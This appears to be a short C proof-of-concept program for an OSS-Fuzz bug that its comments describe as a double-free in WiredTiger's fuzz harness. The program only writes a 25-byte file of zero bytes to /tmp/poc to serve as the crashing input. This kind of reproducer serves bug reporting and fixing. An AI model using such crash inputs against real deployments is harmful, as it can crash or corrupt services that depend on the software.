#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for oss-fuzz:370689421 */
/* Triggers: double-free in LLVMFuzzerTestOneInput (wiredtiger fuzz-eval) */
/* Vuln class: double_free */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* Write 25 zero bytes to trigger the double-free */
    for (int i = 0; i < 25; i++) {
        fputc(0x0, f);
    }

    fclose(f);
    return 0;
}